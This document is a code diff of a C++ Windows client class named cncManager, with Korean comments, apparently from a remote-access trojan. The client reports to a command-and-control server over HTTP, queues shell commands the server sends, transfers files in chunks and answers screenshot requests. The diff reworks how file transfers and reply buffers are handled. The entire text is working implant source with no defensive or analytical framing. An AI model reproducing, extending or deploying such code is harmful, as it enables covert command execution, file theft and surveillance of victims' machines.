@@ -25,7 +25,7 @@ cncManager::~cncManager() {
 }
 
 /* C&C에 http request를 보내는 함수. send후 response parsing을 호출함. */
-void cncManager::sendHttpRequest(LPVOID data, DWORD dlen) {
+void cncManager::sendHttpRequest(LPVOID data, DWORD dlen, DWORD buf_size) {
     //std::lock_guard<std::mutex> guard(this->m1);
     HINTERNET
         hSession = NULL,
@@ -58,10 +58,15 @@ void cncManager::sendHttpRequest(LPVOID data, DWORD dlen) {
         do
         {
             /*Check for available data.*/
-            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
-            {
-                printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
-                break;
+            if (buf_size)
+                dwSize = buf_size;
+
+            else {
+                if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
+                {
+                    printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
+                    break;
+                }
             }
 
             // No more available data.
@@ -75,15 +80,15 @@ void cncManager::sendHttpRequest(LPVOID data, DWORD dlen) {
                 printf("Out of memory\n");
                 break;
             }
-
             // Read the Data.
             ZeroMemory(pszOutBuffer, dwSize + 1);
-
             if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
                 printf("Error %u in WinHttpReadData.\n", GetLastError());
 
             else
+            {
                 this->responseParser((UCHAR*)pszOutBuffer, dwSize);
+            }
 
             delete[] pszOutBuffer;
 
@@ -100,7 +105,7 @@ void cncManager::sendHttpRequest(LPVOID data, DWORD dlen) {
 
 }   
 /* C&C에 데이터 보내는 함수. sendHttpRequest를 Wrapping함. */
-void cncManager::sendData(UCHAR DDtype, ULONG64 dlen, LPVOID data) {
+void cncManager::sendData(UCHAR DDtype, ULONG64 dlen, LPVOID data, DWORD buf_size) {
     if (dlen <= DATA_BUF_SIZE) {
         DDprotocol* dataFrame = new DDprotocol;
         dataFrame->type = DDtype;
@@ -112,7 +117,7 @@ void cncManager::sendData(UCHAR DDtype, ULONG64 dlen, LPVOID data) {
         memcpy(stream, dataFrame, sizeof(DDprotocol));
         memcpy(stream + sizeof(DDprotocol), data, dlen);
 
-        this->sendHttpRequest((LPVOID)stream, sizeof(DDprotocol) + dlen);
+        this->sendHttpRequest((LPVOID)stream, sizeof(DDprotocol) + dlen, buf_size);
         delete dataFrame;
         delete[] stream;
         
@@ -130,7 +135,7 @@ void cncManager::sendData(UCHAR DDtype, ULONG64 dlen, LPVOID data) {
             memset(stream, 0, sizeof(DDprotocol) + DATA_BUF_SIZE);
             memcpy(stream, dataFrame, sizeof(DDprotocol));
             memcpy(stream + sizeof(DDprotocol), (LPVOID)((UCHAR *)data + sended_offset), DATA_BUF_SIZE);
-            this->sendHttpRequest((LPVOID)stream, sizeof(DDprotocol) + DATA_BUF_SIZE);
+            this->sendHttpRequest((LPVOID)stream, sizeof(DDprotocol) + DATA_BUF_SIZE, buf_size);
             seq++;
             left_offset -= DATA_BUF_SIZE;
             sended_offset += DATA_BUF_SIZE;
@@ -148,7 +153,7 @@ void cncManager::sendData(UCHAR DDtype, ULONG64 dlen, LPVOID data) {
             memcpy(stream, dataFrame, sizeof(DDprotocol));
             memcpy(stream + sizeof(DDprotocol), (UCHAR*)data + sended_offset, left_offset);
 
-            this->sendHttpRequest((LPVOID)stream, sizeof(DDprotocol) + left_offset);
+            this->sendHttpRequest((LPVOID)stream, sizeof(DDprotocol) + left_offset, buf_size);
             delete dataFrame;
             delete[] stream;
         }
@@ -183,10 +188,13 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
         resData->seq = *(DWORD *)(res+6);
 
         if (resData->header != DDPROTO_HEADER)
+        { 
+            printf("HEADER : 0x%x\n", resData->header);
             std::cout << "Invalid Header !!!" << std::endl;
+            }
+         
 
         else {
-            std::string data = (char*)(res + 10);
             /* response 핸들러 구현부 */
             switch (resData->type)
             {
@@ -204,6 +212,7 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
 
                 case shellRequest:
                     {
+                    std::string data = (char*)(res + 10);
                     this->printParsedResponse(resData, "SEHLL_REQUEST");
                     std::istringstream spliter(data);
                     std::string tmp;
@@ -212,8 +221,8 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
                         if (!strncmp(tmp.c_str(), "file ", 5)) {
                             this->ftpPath = StringUtil::split(tmp, ' ')[1];
                             std::cout << this->ftpPath << std::endl;
-                            this->sendData(ftpRequest, this->ftpPath.length(), (LPVOID)this->ftpPath.c_str());
-                            this->sendData(ftpRequest, FTP_REQ_DATA_LEN, FTP_REQ_DATA);
+                            std::thread ftpHandler = std::thread(&cncManager::handleFtpResponse, this);
+                            ftpHandler.detach();
                         }
                         else {
                             this->shellCmd.push_back(tmp);
@@ -229,6 +238,7 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
 
                 case ftpRequest:
                 {
+                    std::string data = (char*)(res + 10);
                     /* 스샷 요청 처리 */
                     if (!data.compare("screenshot")) {
                         this->printParsedResponse(resData, "SCREENSHOT_REQUEST");
@@ -252,8 +262,12 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
                 case ftpResponse:
                 {
                     this->printParsedResponse(resData, "FTP_RESPONSE");
-                    std::thread ftpHandler = std::thread(&cncManager::handleFtpResponse, this, data, resData->seq);
-                    ftpHandler.detach();
+                    commandManager commander;
+                    commander.saveFile(this->fp, this->ftpPath, (LPVOID)(res + 10), resData->seq, resData->len);
+                    this->save_seq = resData->seq;
+
+                    break;
+
                 }
             
                 case none:
@@ -278,12 +292,12 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
 
 void cncManager::printParsedResponse(DDprotocol* resData,std::string type) {
     if (this->print_setting) {
-        std::cout << "==parsed data==" << std::endl;
+        std::cout << "====parsed data====" << std::endl;
         std::cout << "header : " << resData->header << std::endl;
         std::cout << "type :" << type << std::endl;
         std::cout << "length :" << resData->len << std::endl;
         std::cout << "sequence :" << resData->seq << std::endl;
-        std::cout << "===============" << std::endl;
+        std::cout << "===================" << std::endl;
     }
 
 }
@@ -304,13 +318,16 @@ void cncManager::handleFtpRequest(std::string path) {
     commander.getFile(path,this->server);
 }
 
-void cncManager::handleFtpResponse(std::string data, DWORD seq) {
-    commandManager commander;
-    commander.saveFile(this->ftpPath, data, seq);
+void cncManager::handleFtpResponse() {
+    std::lock_guard<std::mutex> guard(this->m1);
+    Sleep(1000);
+    this->sendData(ftpRequest, FTP_REQ_DATA_LEN, FTP_REQ_DATA, FTP_REQ_BUF_SIZE);
 
-    if (seq != NOT_SPLITED_SEQ || seq != LAST_SPLITED_SEQ) {
-        this->sendData(ftpRequest, FTP_REQ_DATA_LEN, FTP_REQ_DATA);
+    while ((this->save_seq != NOT_SPLITED_SEQ) && (this->save_seq != LAST_SPLITED_SEQ))
+    {
+        this->sendData(ftpRequest, FTP_REQ_DATA_LEN, FTP_REQ_DATA, FTP_REQ_BUF_SIZE);
     }
+
 }
 
 void cncManager::handleScreenRequest() {
